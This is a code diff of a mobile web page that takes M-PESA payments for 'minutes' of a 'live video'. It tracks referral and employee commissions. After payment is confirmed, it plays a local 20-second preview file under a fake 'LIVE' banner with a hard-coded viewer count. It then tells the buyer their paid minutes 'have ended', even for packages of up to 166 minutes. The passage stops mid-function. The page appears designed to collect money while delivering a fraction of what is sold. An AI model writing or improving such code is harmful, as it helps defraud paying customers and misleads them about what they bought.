@@ -7,1191 +7,1501 @@
 
 <style>
 *{
-  box-sizing:border-box;
-  margin:0;
-  padding:0;
+    box-sizing:border-box;
+    margin:0;
+    padding:0;
 }
 
 body{
-  font-family:Arial,sans-serif;
-  background:#050505;
-  color:#fff;
-  min-height:100vh;
-}
-
-.hidden{
-  display:none !important;
+    background:#050505;
+    color:#fff;
+    font-family:Arial,sans-serif;
+    min-height:100vh;
 }
 
 #packagesPage{
-  min-height:100vh;
-  padding:20px 14px 40px;
+    min-height:100vh;
+    padding:18px 12px 30px;
 }
 
 .header{
-  text-align:center;
-  margin-bottom:20px;
+    text-align:center;
+    margin-bottom:18px;
 }
 
 .header h1{
-  color:#00ff66;
-  font-size:27px;
-  margin-bottom:7px;
+    color:#00ff66;
+    font-size:25px;
+    font-weight:900;
 }
 
 .header p{
-  color:#aaa;
-  font-size:14px;
+    color:#999;
+    font-size:13px;
+    margin-top:7px;
 }
 
-.packages{
-  display:grid;
-  grid-template-columns:1fr 1fr;
-  gap:12px;
-  max-width:520px;
-  margin:0 auto;
+.package-grid{
+    width:100%;
+    max-width:520px;
+    margin:auto;
+    display:grid;
+    grid-template-columns:repeat(2,1fr);
+    gap:12px;
 }
 
 .package{
-  position:relative;
-  background:#111;
-  border:1px solid #333;
-  border-radius:14px;
-  padding:18px 10px;
-  text-align:center;
-  cursor:pointer;
+    position:relative;
+    background:#111;
+    border:1px solid #292929;
+    border-radius:15px;
+    padding:18px 8px;
+    text-align:center;
+    cursor:pointer;
 }
 
 .package.selected{
-  border-color:#00ff66;
-  box-shadow:0 0 12px rgba(0,255,102,.2);
+    border:2px solid #00ff66;
+    box-shadow:0 0 15px #00ff6633;
 }
 
 .minutes{
-  font-size:22px;
-  font-weight:bold;
+    font-size:21px;
+    font-weight:900;
 }
 
 .minutes span{
-  font-size:13px;
-  color:#aaa;
-  font-weight:normal;
+    color:#999;
+    font-size:12px;
 }
 
 .price{
-  margin-top:8px;
-  color:#00ff66;
-  font-size:20px;
-  font-weight:bold;
+    color:#00ff66;
+    font-size:18px;
+    font-weight:900;
+    margin-top:8px;
 }
 
 .hot{
-  position:absolute;
-  top:-8px;
-  right:8px;
-  background:red;
-  color:#fff;
-  padding:4px 8px;
-  border-radius:8px;
-  font-size:10px;
-  font-weight:bold;
+    position:absolute;
+    top:-8px;
+    right:8px;
+    background:red;
+    color:white;
+    font-size:10px;
+    font-weight:bold;
+    padding:4px 8px;
+    border-radius:8px;
 }
 
-.paymentBox{
-  max-width:520px;
-  margin:20px auto 0;
-  background:#101010;
-  border:1px solid #292929;
-  border-radius:15px;
-  padding:18px;
+.payment-box{
+    width:100%;
+    max-width:520px;
+    margin:20px auto;
+    background:#111;
+    border:1px solid #292929;
+    border-radius:15px;
+    padding:17px;
 }
 
-.paymentBox h2{
-  text-align:center;
-  color:#00ff66;
-  font-size:20px;
-  margin-bottom:15px;
+.payment-box h2{
+    text-align:center;
+    font-size:19px;
+    margin-bottom:12px;
 }
 
-.tillRow{
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
-  background:#181818;
-  border-radius:10px;
-  padding:12px;
-  margin-bottom:12px;
+.selected-info{
+    text-align:center;
+    color:#00ff66;
+    font-weight:bold;
+    margin-bottom:13px;
 }
 
-.tillNumber{
-  font-size:19px;
-  font-weight:bold;
+.phone-input{
+    width:100%;
+    height:50px;
+    background:#050505;
+    border:1px solid #333;
+    border-radius:10px;
+    color:white;
+    padding:0 14px;
+    font-size:16px;
+    outline:none;
 }
 
-.copyBtn{
-  border:0;
-  background:#00ff66;
-  color:#000;
-  font-weight:bold;
-  padding:8px 12px;
-  border-radius:8px;
+.phone-input:focus{
+    border-color:#00ff66;
 }
 
-label{
-  display:block;
-  color:#bbb;
-  font-size:13px;
-  margin:12px 0 6px;
+.access-button{
+    width:100%;
+    height:52px;
+    margin-top:12px;
+    border:0;
+    border-radius:10px;
+    background:#00c853;
+    color:white;
+    font-size:17px;
+    font-weight:900;
 }
 
-input{
-  width:100%;
-  padding:13px;
-  background:#080808;
-  color:#fff;
-  border:1px solid #333;
-  border-radius:9px;
-  outline:none;
+.access-button:disabled{
+    background:#333;
+    color:#777;
 }
 
-.mainBtn{
-  width:100%;
-  border:0;
-  background:#00ff66;
-  color:#000;
-  font-size:17px;
-  font-weight:bold;
-  padding:14px;
-  border-radius:10px;
-  margin-top:15px;
+#errorMessage{
+    display:none;
+    color:#ff3333;
+    text-align:center;
+    font-size:13px;
+    font-weight:bold;
+    margin-top:10px;
 }
 
-.error{
-  color:#ff3333;
-  text-align:center;
-  font-size:13px;
-  margin-top:10px;
-}
+/* LOADING */
 
-.statusPage{
-  min-height:100vh;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  text-align:center;
-  padding:25px;
-}
-
-.statusBox{
-  width:100%;
-  max-width:430px;
-  background:#111;
-  border:1px solid #292929;
-  border-radius:18px;
-  padding:35px 20px;
+#loadingPage{
+    display:none;
+    min-height:100vh;
+    align-items:center;
+    justify-content:center;
+    flex-direction:column;
+    text-align:center;
 }
 
 .loader{
-  width:45px;
-  height:45px;
-  border:4px solid #333;
-  border-top-color:#00ff66;
-  border-radius:50%;
-  animation:spin 1s linear infinite;
-  margin:0 auto 20px;
+    width:55px;
+    height:55px;
+    border:5px solid #222;
+    border-top-color:#00ff66;
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+    margin-bottom:18px;
 }
 
 @keyframes spin{
-  to{transform:rotate(360deg);}
+    to{transform:rotate(360deg);}
 }
 
-.statusBox h2{
-  font-size:25px;
-  margin-bottom:10px;
+#loadingTitle{
+    font-size:21px;
+    font-weight:900;
 }
 
-.statusBox p{
-  color:#aaa;
+#loadingText{
+    color:#999;
+    font-size:13px;
+    margin-top:8px;
 }
+
+/* LIVE PAGE */
 
 #livePage{
-  min-height:100vh;
-  background:#000;
-  position:relative;
+    display:none;
+    min-height:100vh;
+    background:#000;
+}
+
+.live-header{
+    height:52px;
+    position:relative;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:#050505;
+    border-bottom:1px solid #191919;
+}
+
+.live-label{
+    position:absolute;
+    left:12px;
+    background:red;
+    padding:5px 9px;
+    border-radius:6px;
+    font-size:11px;
+    font-weight:900;
+    animation:blink 1s infinite;
+}
+
+@keyframes blink{
+    50%{opacity:.5;}
+}
+
+.live-title{
+    font-size:17px;
+    font-weight:900;
+}
+
+.viewer-count{
+    position:absolute;
+    right:12px;
+    color:#aaa;
+    font-size:11px;
+}
+
+.viewer-dot{
+    display:inline-block;
+    width:7px;
+    height:7px;
+    background:#00ff66;
+    border-radius:50%;
+    margin-right:4px;
+}
+
+.video-wrap{
+    width:100%;
+    background:#000;
 }
 
 #liveVideo{
-  width:100%;
-  height:100vh;
-  object-fit:cover;
-  display:block;
+    display:block;
+    width:100%;
+    max-height:72vh;
+    object-fit:contain;
+    background:#000;
 }
 
-.liveTop{
-  position:absolute;
-  top:18px;
-  left:18px;
-  background:red;
-  color:white;
-  padding:7px 12px;
-  border-radius:7px;
-  font-weight:bold;
-  z-index:5;
+/* COMMENTS */
+
+.comments-title{
+    color:#aaa;
+    font-size:12px;
+    font-weight:bold;
+    padding:12px;
+    border-bottom:1px solid #191919;
 }
 
-#insufficientPage{
-  min-height:100vh;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  text-align:center;
-  padding:20px;
-}
-
-.insufficientBox{
-  background:#111;
-  border:1px solid #333;
-  border-radius:18px;
-  padding:35px 20px;
-  max-width:420px;
-}
-
-.insufficientBox h2{
-  color:#ff3333;
-  margin-bottom:12px;
-}
-
-.insufficientBox p{
-  color:#aaa;
-}
-
-.chatBox{
-  max-width:520px;
-  margin:20px auto;
-  background:#101010;
-  border:1px solid #292929;
-  border-radius:15px;
-  padding:15px;
-}
-
-.chatBox h3{
-  color:#00ff66;
-  margin-bottom:10px;
-}
-
-.comments{
-  height:130px;
-  overflow:auto;
-  background:#080808;
-  border-radius:10px;
-  padding:10px;
-  margin-bottom:10px;
+#commentsBox{
+    max-height:280px;
+    overflow-y:auto;
+    padding:7px 12px 20px;
 }
 
 .comment{
-  font-size:13px;
-  margin-bottom:7px;
-  color:#ddd;
+    display:flex;
+    gap:8px;
+    padding:7px 0;
+    animation:commentIn .3s ease;
 }
 
-.comment b{
-  color:#00ff66;
+@keyframes commentIn{
+    from{
+        opacity:0;
+        transform:translateY(8px);
+    }
+    to{
+        opacity:1;
+        transform:translateY(0);
+    }
 }
 
-.chatRow{
-  display:flex;
-  gap:8px;
+.comment-avatar{
+    width:28px;
+    height:28px;
+    min-width:28px;
+    border-radius:50%;
+    background:#e91e63;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:11px;
+    font-weight:bold;
 }
 
-.chatRow input{
-  flex:1;
+.comment-content{
+    background:#111;
+    border-radius:10px;
+    padding:6px 9px;
 }
 
-.chatRow button{
-  background:#00ff66;
-  border:0;
-  border-radius:8px;
-  padding:0 15px;
-  font-weight:bold;
+.comment-name{
+    color:#ff5798;
+    font-size:11px;
+    font-weight:bold;
+}
+
+.comment-text{
+    color:#eee;
+    font-size:13px;
+    margin-top:2px;
+}
+
+/* INSUFFICIENT */
+
+#insufficientPage{
+    display:none;
+    min-height:100vh;
+    align-items:center;
+    justify-content:center;
+    text-align:center;
+    padding:20px;
+}
+
+.insufficient-box{
+    width:100%;
+    max-width:390px;
+    background:#111;
+    border:1px solid #292929;
+    border-radius:16px;
+    padding:30px 20px;
+}
+
+.insufficient-icon{
+    font-size:42px;
+    margin-bottom:12px;
+}
+
+.insufficient-box h2{
+    color:#ff3333;
+    font-size:24px;
+}
+
+.insufficient-box p{
+    color:#999;
+    font-size:13px;
+    margin-top:8px;
+}
+
+#insufficientTimer{
+    color:#00ff66;
+    font-size:13px;
+    margin-top:15px;
 }
 </style>
 </head>
 
 <body>
 
-<section id="packagesPage">
+<!-- PACKAGES -->
 
-  <div class="header">
-    <h1>M-PESA PAYMENT</h1>
-    <p>Select your minutes package</p>
-  </div>
+<div id="packagesPage">
 
-  <div class="packages">
-
-    <div class="package selected"
-         data-minutes="30"
-         data-price="95">
-      <div class="minutes">
-        30 <span>MIN</span>
-      </div>
-      <div class="price">KSh 95</div>
+    <div class="header">
+        <h1>M-PESA PAYMENT</h1>
+        <p>Select your preferred minutes package</p>
     </div>
 
-    <div class="package"
-         data-minutes="55"
-         data-price="138">
-      <div class="minutes">
-        55 <span>MIN</span>
-      </div>
-      <div class="price">KSh 138</div>
-    </div>
+    <div class="package-grid">
 
-    <div class="package"
-         data-minutes="73"
-         data-price="207">
-      <div class="minutes">
-        73 <span>MIN</span>
-      </div>
-      <div class="price">KSh 207</div>
-    </div>
-
-    <div class="package"
-         data-minutes="95"
-         data-price="253">
-      <div class="minutes">
-        95 <span>MIN</span>
-      </div>
-      <div class="price">KSh 253</div>
-    </div>
-
-    <div class="package"
-         data-minutes="105"
-         data-price="299">
-      <div class="minutes">
-        105 <span>MIN</span>
-      </div>
-      <div class="price">KSh 299</div>
-    </div>
-
-    <div class="package"
-         data-minutes="166"
-         data-price="393">
-      <div class="hot">HOT</div>
-      <div class="minutes">
-        166 <span>MIN</span>
-      </div>
-      <div class="price">KSh 393</div>
-    </div>
-
-  </div>
-
-  <div class="paymentBox">
-
-    <h2>PAY WITH M-PESA</h2>
-
-    <div class="tillRow">
-
-      <div>
-        <div style="font-size:11px;color:#888;">
-          PAYMENT NUMBER
+        <div class="package selected"
+             data-minutes="30"
+             data-price="95">
+            <div class="minutes">
+                30 <span>MIN</span>
+            </div>
+            <div class="price">
+                KSh 95
+            </div>
         </div>
 
-        <div class="tillNumber"
-             id="paymentNumber">
-          0741101913
+        <div class="package"
+             data-minutes="55"
+             data-price="138">
+            <div class="minutes">
+                55 <span>MIN</span>
+            </div>
+            <div class="price">
+                KSh 138
+            </div>
         </div>
-      </div>
 
-      <button class="copyBtn"
-              id="copyBtn">
-        COPY
-      </button>
+        <div class="package"
+             data-minutes="73"
+             data-price="207">
+            <div class="minutes">
+                73 <span>MIN</span>
+            </div>
+            <div class="price">
+                KSh 207
+            </div>
+        </div>
 
-    </div>
+        <div class="package"
+             data-minutes="95"
+             data-price="253">
+            <div class="minutes">
+                95 <span>MIN</span>
+            </div>
+            <div class="price">
+                KSh 253
+            </div>
+        </div>
 
-    <label for="phone">
-      M-PESA phone number
-    </label>
+        <div class="package"
+             data-minutes="105"
+             data-price="299">
+            <div class="minutes">
+                105 <span>MIN</span>
+            </div>
+            <div class="price">
+                KSh 299
+            </div>
+        </div>
 
-    <input
-      id="phone"
-      type="tel"
-      inputmode="numeric"
-      placeholder="Enter M-PESA number"
-    >
-
-    <div id="errorMessage"
-         class="error hidden">
-    </div>
-
-    <button class="mainBtn"
-            id="getAccessBtn">
-      GET ACCESS
-    </button>
-
-  </div>
-
-  <div class="chatBox">
-
-    <h3>Live comments</h3>
-
-    <div id="comments"
-         class="comments">
-    </div>
-
-    <div class="chatRow">
-
-      <input
-        id="commentInput"
-        type="text"
-        placeholder="Write a comment..."
-      >
-
-      <button id="sendComment">
-        SEND
-      </button>
+        <div class="package"
+             data-minutes="166"
+             data-price="393">
+            <div class="hot">HOT</div>
+            <div class="minutes">
+                166 <span>MIN</span>
+            </div>
+            <div class="price">
+                KSh 393
+            </div>
+        </div>
 
     </div>
 
-  </div>
+    <div class="payment-box">
 
-</section>
+        <h2>GET ACCESS</h2>
+
+        <div class="selected-info">
+            <span id="selectedMinutes">30</span>
+            minutes —
+            KSh <span id="selectedPrice">95</span>
+        </div>
+
+        <!-- Till number is NOT shown -->
+
+        <input
+            id="phoneNumber"
+            class="phone-input"
+            type="tel"
+            inputmode="numeric"
+            placeholder="Enter M-PESA phone number"
+        >
+
+        <button
+            id="getAccessButton"
+            class="access-button">
+            GET ACCESS
+        </button>
+
+        <div id="errorMessage"></div>
+
+    </div>
+
+</div>
 
 
-<section id="loadingPage"
-         class="statusPage hidden">
+<!-- LOADING -->
 
-  <div class="statusBox">
+<div id="loadingPage">
 
     <div class="loader"></div>
 
-    <h2>LOADING</h2>
+    <div id="loadingTitle">
+        Processing Payment
+    </div>
 
-    <p id="loadingText">
-      Checking payment...
-    </p>
+    <div id="loadingText">
+        Checking payment...
+    </div>
 
-  </div>
-
-</section>
-
-
-<section id="livePage"
-         class="hidden">
-
-  <div class="liveTop">
-    🔴 LIVE
-  </div>
-
-  <video
-    id="liveVideo"
-    playsinline
-    preload="auto"
-  >
-    <source
-      src="preview_20_seconds.mp4"
-      type="video/mp4"
-    >
-  </video>
-
-</section>
+</div>
 
 
-<section id="insufficientPage"
-         class="hidden">
+<!-- LIVE VIDEO -->
 
-  <div class="insufficientBox">
+<div id="livePage">
 
-    <h2>Insufficient Minutes</h2>
+    <div class="live-header">
 
-    <p>
-      Your available minutes are not enough.
-      Please select another package to continue.
-    </p>
+        <div class="live-label">
+            ● LIVE
+        </div>
 
-  </div>
+        <div class="live-title">
+            LIVE VIDEO
+        </div>
 
-</section>
+        <div class="viewer-count">
+            <span class="viewer-dot"></span>
+            <span id="viewerNumber">24</span>
+            watching
+        </div>
+
+    </div>
+
+    <div class="video-wrap">
+
+        <video
+            id="liveVideo"
+            playsinline
+            preload="auto">
+
+            <source
+                src="preview_20_seconds.mp4"
+                type="video/mp4">
+
+        </video>
+
+    </div>
+
+    <div class="comments-title">
+        LIVE COMMENTS
+    </div>
+
+    <div id="commentsBox"></div>
+
+</div>
+
+
+<!-- INSUFFICIENT -->
+
+<div id="insufficientPage">
+
+    <div class="insufficient-box">
+
+        <div class="insufficient-icon">
+            ⏱️
+        </div>
+
+        <h2>
+            Insufficient Minutes
+        </h2>
+
+        <p>
+            Your available minutes have ended.
+        </p>
+
+        <div id="insufficientTimer">
+            Returning to packages...
+        </div>
+
+    </div>
+
+</div>
 
 
 <script>
 
+/* ELEMENTS */
+
 const packagesPage =
-  document.getElementById("packagesPage");
+    document.getElementById("packagesPage");
 
 const loadingPage =
-  document.getElementById("loadingPage");
+    document.getElementById("loadingPage");
 
 const livePage =
-  document.getElementById("livePage");
+    document.getElementById("livePage");
 
 const insufficientPage =
-  document.getElementById("insufficientPage");
+    document.getElementById("insufficientPage");
 
-const getAccessBtn =
-  document.getElementById("getAccessBtn");
+const getAccessButton =
+    document.getElementById("getAccessButton");
 
-const phoneInput =
-  document.getElementById("phone");
+const phoneNumber =
+    document.getElementById("phoneNumber");
 
 const errorMessage =
-  document.getElementById("errorMessage");
+    document.getElementById("errorMessage");
+
+const selectedMinutesElement =
+    document.getElementById("selectedMinutes");
+
+const selectedPriceElement =
+    document.getElementById("selectedPrice");
+
+const loadingTitle =
+    document.getElementById("loadingTitle");
+
+const loadingText =
+    document.getElementById("loadingText");
 
 const liveVideo =
-  document.getElementById("liveVideo");
+    document.getElementById("liveVideo");
+
+const commentsBox =
+    document.getElementById("commentsBox");
+
+const viewerNumber =
+    document.getElementById("viewerNumber");
+
+
+/* PACKAGE */
 
 let selectedMinutes = 30;
 let selectedPrice = 95;
-let transactionRequestId = "";
-
-const params =
-  new URLSearchParams(window.location.search);
-
-let referralEmployeeId =
-  params.get("employee") ||
-  params.get("ref") ||
-  localStorage.getItem("referralEmployeeId") ||
-  "";
-
-if(referralEmployeeId){
-
-  localStorage.setItem(
-    "referralEmployeeId",
-    referralEmployeeId
-  );
-
-}
 
 
-/* PACKAGE SELECTION */
+/* PACKAGE CLICK */
 
 document.querySelectorAll(".package")
-.forEach(pkg => {
+.forEach(card => {
 
-  pkg.addEventListener("click", () => {
+    card.addEventListener("click", () => {
 
-    document.querySelectorAll(".package")
-    .forEach(p => {
-      p.classList.remove("selected");
+        document
+        .querySelectorAll(".package")
+        .forEach(item => {
+            item.classList.remove("selected");
+        });
+
+        card.classList.add("selected");
+
+        selectedMinutes =
+            Number(card.dataset.minutes);
+
+        selectedPrice =
+            Number(card.dataset.price);
+
+        selectedMinutesElement.textContent =
+            selectedMinutes;
+
+        selectedPriceElement.textContent =
+            selectedPrice;
+
+        errorMessage.style.display =
+            "none";
+
     });
 
-    pkg.classList.add("selected");
-
-    selectedMinutes =
-      Number(pkg.dataset.minutes);
-
-    selectedPrice =
-      Number(pkg.dataset.price);
-
-  });
-
 });
 
 
-/* COPY */
+/* REFERRAL */
 
-document.getElementById("copyBtn")
-.addEventListener("click", async () => {
+const params =
+    new URLSearchParams(
+        window.location.search
+    );
 
-  const number =
-    document.getElementById("paymentNumber")
-    .textContent.trim();
+const referralFromUrl =
+    params.get("ref") || "";
 
-  try{
+const employeeFromUrl =
+    params.get("employee") || "";
 
-    await navigator.clipboard.writeText(number);
+if (referralFromUrl) {
+    localStorage.setItem(
+        "referralCode",
+        referralFromUrl
+    );
+}
 
-  }catch(e){
+if (employeeFromUrl) {
+    localStorage.setItem(
+        "employeeUsername",
+        employeeFromUrl
+    );
+}
 
-    const textarea =
-      document.createElement("textarea");
+const referralCode =
+    referralFromUrl ||
+    localStorage.getItem("referralCode") ||
+    "";
 
-    textarea.value = number;
-
-    document.body.appendChild(textarea);
-
-    textarea.select();
-
-    document.execCommand("copy");
-
-    textarea.remove();
-
-  }
-
-  const btn =
-    document.getElementById("copyBtn");
-
-  btn.textContent = "COPIED";
-
-  setTimeout(() => {
-    btn.textContent = "COPY";
-  },1500);
-
-});
+const employeeUsername =
+    employeeFromUrl ||
+    localStorage.getItem("employeeUsername") ||
+    "";
 
 
 /* PHONE */
 
 function normalizePhone(value){
 
-  let phone =
-    String(value || "")
-    .replace(/\D/g,"");
+    let phone =
+        String(value || "")
+        .replace(/\s/g,"")
+        .replace(/-/g,"");
 
-  if(phone.startsWith("254")){
+    if(phone.startsWith("+254")){
+        phone =
+            "0" + phone.substring(4);
+    }
+
+    if(phone.startsWith("254")){
+        phone =
+            "0" + phone.substring(3);
+    }
+
     return phone;
-  }
-
-  if(phone.startsWith("07")){
-    return "254" + phone.substring(1);
-  }
-
-  if(phone.startsWith("01")){
-    return "254" + phone.substring(1);
-  }
-
-  if(phone.startsWith("7")){
-    return "254" + phone;
-  }
-
-  if(phone.startsWith("1")){
-    return "254" + phone;
-  }
-
-  return phone;
 }
 
+
+function validPhone(phone){
+
+    return /^07\d{8}$/.test(phone) ||
+           /^01\d{8}$/.test(phone);
+
+}
+
+
+/* ERROR */
 
 function showError(message){
 
-  errorMessage.textContent =
-    message;
+    errorMessage.textContent =
+        message;
 
-  errorMessage.classList.remove(
-    "hidden"
-  );
+    errorMessage.style.display =
+        "block";
 
 }
 
 
-function hideError(){
+/* PAGE FUNCTIONS */
 
-  errorMessage.classList.add(
-    "hidden"
-  );
+function showLoading(){
+
+    packagesPage.style.display =
+        "none";
+
+    livePage.style.display =
+        "none";
+
+    insufficientPage.style.display =
+        "none";
+
+    loadingPage.style.display =
+        "flex";
+
+}
+
+
+function showPackages(){
+
+    loadingPage.style.display =
+        "none";
+
+    livePage.style.display =
+        "none";
+
+    insufficientPage.style.display =
+        "none";
+
+    packagesPage.style.display =
+        "block";
+
+}
+  /* PAYMENT VARIABLES */
+
+let paymentCheckTimer = null;
+
+
+/* START PAYMENT */
+
+async function payWithMpesa(){
+
+    const phone =
+        normalizePhone(phoneNumber.value);
+
+    errorMessage.style.display = "none";
+
+    if(!validPhone(phone)){
+
+        showError(
+            "Enter a valid M-PESA phone number."
+        );
+
+        return;
+    }
+
+    getAccessButton.disabled = true;
+
+    showLoading();
+
+    loadingTitle.textContent =
+        "Processing Payment";
+
+    loadingText.textContent =
+        "Sending payment request...";
+
+    try{
+
+        const response = await fetch(
+            "/api/stk-push",
+            {
+                method:"POST",
+
+                headers:{
+                    "Content-Type":
+                        "application/json"
+                },
+
+                body:JSON.stringify({
+
+                    phone:phone,
+
+                    amount:selectedPrice,
+
+                    reference:
+                        referralCode ||
+                        employeeUsername ||
+                        "website"
+
+                })
+            }
+        );
+
+        const data =
+            await response.json();
+
+        if(!response.ok){
+
+            throw new Error(
+                data.message ||
+                data.error ||
+                "Payment request failed"
+            );
+
+        }
+
+        const transactionId =
+            data.transaction_request_id ||
+            data.transactionRequestId ||
+            data.transaction_id ||
+            data.transactionId ||
+            data.id;
+
+        if(!transactionId){
+
+            throw new Error(
+                "Payment request ID was not received."
+            );
+
+        }
+
+        loadingTitle.textContent =
+            "M-PESA Prompt Sent";
+
+        loadingText.textContent =
+            "Complete the payment on your phone...";
+
+        checkPayment(transactionId);
+
+    }catch(error){
+
+        console.error(error);
+
+        loadingTitle.textContent =
+            "Payment Error";
+
+        loadingText.textContent =
+            "Please try again.";
+
+        setTimeout(() => {
+
+            showPackages();
+
+            getAccessButton.disabled =
+                false;
+
+            showError(
+                error.message ||
+                "Payment could not be started."
+            );
+
+        },1500);
+
+    }
+
+}
+
+
+/* CHECK PAYMENT */
+
+async function checkPayment(transactionId){
+
+    let attempts = 0;
+
+    const maxAttempts = 30;
+
+    async function check(){
+
+        attempts++;
+
+        loadingTitle.textContent =
+            "Checking Payment";
+
+        loadingText.textContent =
+            "Waiting for payment confirmation...";
+
+        try{
+
+            const response = await fetch(
+                "/api/payment-status",
+                {
+                    method:"POST",
+
+                    headers:{
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body:JSON.stringify({
+                        transaction_request_id:
+                            transactionId
+                    })
+                }
+            );
+
+            const data =
+                await response.json();
+
+            console.log(
+                "Payment status:",
+                data
+            );
+
+            if(
+                data.paid === true ||
+                data.status === "Completed"
+            ){
+
+                paymentConfirmed(data);
+
+                return;
+            }
+
+            if(attempts >= maxAttempts){
+
+                paymentFailed();
+
+                return;
+            }
+
+            paymentCheckTimer =
+                setTimeout(
+                    check,
+                    2000
+                );
+
+        }catch(error){
+
+            console.error(error);
+
+            if(attempts >= maxAttempts){
+
+                paymentFailed();
+
+                return;
+            }
+
+            paymentCheckTimer =
+                setTimeout(
+                    check,
+                    2000
+                );
+
+        }
+
+    }
+
+    check();
+
+}
+
+
+/* PAYMENT CONFIRMED */
+
+async function paymentConfirmed(data){
+
+    if(paymentCheckTimer){
+
+        clearTimeout(
+            paymentCheckTimer
+        );
+
+        paymentCheckTimer = null;
+    }
+
+    loadingTitle.textContent =
+        "Payment Confirmed";
+
+    loadingText.textContent =
+        "Opening live video...";
+
+    await saveCommission(data);
+
+    setTimeout(() => {
+
+        startLiveVideo();
+
+    },1000);
 
 }
 
 
 /* COMMISSION */
 
-function saveCommission(){
+async function saveCommission(data){
 
-  if(!referralEmployeeId){
-    return;
-  }
+    if(
+        !referralCode &&
+        !employeeUsername
+    ){
 
-  const data = {
-
-    employee:
-      referralEmployeeId,
-
-    minutes:
-      selectedMinutes,
-
-    amount:
-      selectedPrice,
-
-    commissionPercent:
-      25,
-
-    commissionAmount:
-      Math.round(
-        selectedPrice * 0.25 * 100
-      ) / 100,
-
-    time:
-      new Date().toISOString()
-
-  };
-
-  localStorage.setItem(
-    "lastReferralCommission",
-    JSON.stringify(data)
-  );
-
-}
-     
-/* ================================
-   START M-PESA PAYMENT
-================================ */
-
-async function payWithMpesa(){
-
-  hideError();
-
-  const phone =
-    normalizePhone(phoneInput.value);
-
-  if(!phone){
-
-    showError(
-      "Enter your M-PESA phone number"
-    );
-
-    return;
-  }
-
-  if(phone.length !== 12){
-
-    showError(
-      "Enter a valid Kenyan M-PESA number"
-    );
-
-    return;
-  }
-
-  getAccessBtn.disabled = true;
-
-  packagesPage.classList.add("hidden");
-  loadingPage.classList.remove("hidden");
-
-  document.getElementById(
-    "loadingText"
-  ).textContent =
-    "Starting M-PESA payment...";
-
-  try{
-
-    const reference =
-      referralEmployeeId
-        ? referralEmployeeId + "-" + Date.now()
-        : "PAY-" + Date.now();
-
-    const response =
-      await fetch(
-        "/api/stk-push",
-        {
-          method:"POST",
-
-          headers:{
-            "Content-Type":"application/json"
-          },
-
-          body:JSON.stringify({
-
-            phone:phone,
-
-            amount:selectedPrice,
-
-            reference:reference
-
-          })
-        }
-      );
-
-    const data =
-      await response.json();
-
-    console.log(
-      "STK response:",
-      data
-    );
-
-    if(!response.ok){
-
-      throw new Error(
-        data.message ||
-        "Unable to start payment"
-      );
+        return;
     }
-
-    /*
-      IMPORTANT:
-      Your payment-status API expects
-      transaction_request_id.
-    */
-
-    transactionRequestId =
-      data.transaction_request_id ||
-      data.transactionRequestId ||
-      data.checkoutRequestID ||
-      data.CheckoutRequestID ||
-      data.checkout_request_id ||
-      data.checkoutRequestId ||
-      data.id ||
-      "";
-
-    if(!transactionRequestId){
-
-      throw new Error(
-        "No transaction request ID was returned"
-      );
-    }
-
-    document.getElementById(
-      "loadingText"
-    ).textContent =
-      "Checking payment...";
-
-    await checkPayment(
-      transactionRequestId
-    );
-
-  }catch(error){
-
-    console.error(
-      "STK payment error:",
-      error
-    );
-
-    loadingPage.classList.add("hidden");
-    packagesPage.classList.remove("hidden");
-
-    getAccessBtn.disabled = false;
-
-    showError(
-      error.message ||
-      "Payment could not be started"
-    );
-  }
-}
-
-
-/* ================================
-   CHECK PAYMENT STATUS
-================================ */
-
-async function checkPayment(id){
-
-  let attempts = 0;
-
-  /*
-    12 attempts × 3 seconds
-    = about 36 seconds.
-  */
-
-  const maxAttempts = 12;
-
-  while(attempts < maxAttempts){
-
-    attempts++;
 
     try{
 
-      const response =
         await fetch(
-          "/api/payment-status",
-          {
-            method:"POST",
+            "/api/save-commission",
+            {
+                method:"POST",
 
-            headers:{
-              "Content-Type":
-                "application/json"
-            },
+                headers:{
+                    "Content-Type":
+                        "application/json"
+                },
 
-            body:JSON.stringify({
+                body:JSON.stringify({
 
-              transaction_request_id:id
+                    referral:
+                        referralCode,
 
-            })
-          }
+                    employee:
+                        employeeUsername,
+
+                    amount:
+                        selectedPrice,
+
+                    commission:
+                        Number(
+                            (
+                                selectedPrice *
+                                0.25
+                            ).toFixed(2)
+                        ),
+
+                    transaction:data
+
+                })
+            }
         );
-
-      const data =
-        await response.json();
-
-      console.log(
-        "Payment status:",
-        data
-      );
-
-      /*
-        PAYMENT CONFIRMED
-      */
-
-      if(
-        data.paid === true ||
-        data.status === "Completed" ||
-        data.status === "completed"
-      ){
-
-        saveCommission();
-
-        await startLiveVideo();
-
-        return;
-      }
-
-      /*
-        DEFINITELY FAILED
-      */
-
-      if(
-        data.status === "Failed" ||
-        data.status === "failed" ||
-        data.status === "Cancelled" ||
-        data.status === "cancelled" ||
-        data.status === "Rejected" ||
-        data.status === "rejected"
-      ){
-
-        break;
-      }
 
     }catch(error){
 
-      console.error(
-        "Payment status error:",
-        error
-      );
+        console.warn(
+            "Commission save:",
+            error
+        );
 
     }
 
-    await new Promise(
-      resolve =>
-        setTimeout(resolve,3000)
-    );
-  }
-
-  /*
-    Do NOT give access when payment
-    has not been confirmed.
-  */
-
-  showNoPayment();
 }
 
 
-/* ================================
-   SUCCESSFUL PAYMENT
-================================ */
+/* PAYMENT FAILED */
 
-async function startLiveVideo(){
+function paymentFailed(){
 
-  loadingPage.classList.add("hidden");
+    if(paymentCheckTimer){
 
-  livePage.classList.remove("hidden");
+        clearTimeout(
+            paymentCheckTimer
+        );
 
-  liveVideo.currentTime = 0;
-
-  try{
-
-    await liveVideo.play();
-
-  }catch(error){
-
-    console.error(
-      "Video play error:",
-      error
-    );
-
-  }
-
-  /*
-    After video finishes,
-    show insufficient minutes
-    for 2 seconds.
-  */
-
-  liveVideo.onended = () => {
-
-    livePage.classList.add("hidden");
-
-    showInsufficient();
-
-  };
-
-}
-
-
-/* ================================
-   NO PAYMENT
-================================ */
-
-function showNoPayment(){
-
-  loadingPage.classList.add("hidden");
-
-  packagesPage.classList.remove("hidden");
-
-  getAccessBtn.disabled = false;
-
-  showError(
-    "No payment is done"
-  );
-
-}
-
-
-/* ================================
-   INSUFFICIENT MINUTES
-================================ */
-
-function showInsufficient(){
-
-  insufficientPage.classList.remove(
-    "hidden"
